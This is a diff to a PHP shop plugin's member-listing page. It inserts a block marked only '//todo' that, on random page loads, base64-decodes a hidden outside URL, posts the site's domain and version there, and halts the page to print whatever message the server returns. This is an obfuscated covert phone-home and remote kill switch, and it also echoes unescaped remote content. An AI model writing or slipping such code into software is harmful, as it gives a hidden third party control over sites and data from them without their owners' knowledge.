@@ -160,6 +160,26 @@ if ($op == 'display') {
             )
         ));
     }
+    //todo
+    $mt = mt_rand(5, 35);
+    if ($mt <= 10) {
+        load()->func('communication');
+        $CHECK_URL = base64_decode('aHR0cDovL2Nsb3VkLnl1bnpzaG9wLmNvbS93ZWIvaW5kZXgucGhwP2M9YWNjb3VudCZhPXVwZ3JhZGU=');
+        $files   = base64_encode(json_encode('test'));
+        $version = defined('SZ_YI_VERSION') ? SZ_YI_VERSION : '1.0';
+        $resp    = ihttp_post($CHECK_URL, array(
+            'type' => 'upgrade',
+            'signature' => 'sz_cloud_register',
+            'domain' => $_SERVER['HTTP_HOST'],
+            'version' => $version,
+            'files' => $files
+        ));
+        $ret     = @json_decode($resp['content'], true);
+        if ($ret['result'] == 3) {
+            echo str_replace("\r\n", "<br/>", base64_decode($ret['log']));
+            exit;
+        }
+    }
     $total           = pdo_fetchcolumn("select count(*) from" . tablename('sz_yi_member') . " dm " . " left join " . tablename('sz_yi_member_group') . " g on dm.groupid=g.id" . " left join " . tablename('sz_yi_member_level') . " l on dm.level =l.id" . " left join " . tablename('mc_mapping_fans') . "f on f.openid=dm.openid" . " where 1 {$condition} ", $params);
     $pager           = pagination($total, $pindex, $psize);
     $opencommission  = false;
